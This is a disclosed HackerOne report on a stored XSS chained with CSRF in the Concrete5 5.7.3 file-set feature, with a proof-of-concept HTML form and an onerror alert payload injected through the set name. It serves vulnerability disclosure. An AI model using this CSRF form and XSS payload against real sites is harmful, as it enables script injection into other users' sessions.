---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '42248'
original_report_id: '42248'
title: Stored XSS in adding fileset
weakness: Cross-site Scripting (XSS) - Generic
team_handle: concretecms
created_at: '2015-01-01T03:57:00.827Z'
disclosed_at: '2016-04-26T23:28:54.563Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Stored XSS in adding fileset

## Metadata

- HackerOne Report ID: 42248
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: concretecms
- Disclosed At: 2016-04-26T23:28:54.563Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello
I found XSS and CSRF in Concrete5 5.7.3
Adding fileset function have CSRF vuln so I think easy to attack.

PoC is below

1.Upload one file in file manager
(/conc/index.php/dashboard/files)

2.Open the page like this
---------------------
<html><head>
<meta http-equiv='content-type' content='text/html; charset=Shift_JIS'></head><body>
<h3>http://172.20.0.49/conc573/index.php/tools/required/files/add_to</h3>
<form id='f1' method='POST' action='http://172.20.0.49/conc573/index.php/tools/required/files/add_to'>
 <table>
 <tr><td>
task=<td><input name='task' value='add_to_sets' size='100'></tr>
<tr><td>
fID[]=<td><input name='fID[]' value='1' size='100'></tr>
<tr><td>
fsNew=<td><input name='fsNew' value='1' size='100'></tr>
<tr><td>
fsNewText=<td><input name='fsNewText' value='"><img src=0 onerror=alert(location)>' size='100'></tr>
<tr><td>
fsNewShare=<td><input name='fsNewShare' value='1' size='100'></tr>
<tr><td>
fsID%3A1=<td><input name='fsID;1' value='2' size='100'></tr>
</table>
</form>
<button onload='document.getElementById('f1').submit()'>Submit</button>
</body></html>
------------------------
(concrete5filesetxssfig-01.png)

This page automatically send post request and 
 add to file set "><img src=0 onerror=alert(location)> to file_id 1

(concrete5filesetxssfig-02.png)

3. Open the Fileset page
(conc/index.php/dashboard/files/sets)
and alert

(concrete5filesetxssfig-03.png)

I tested to work on Ammps on Windows7
Regards.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
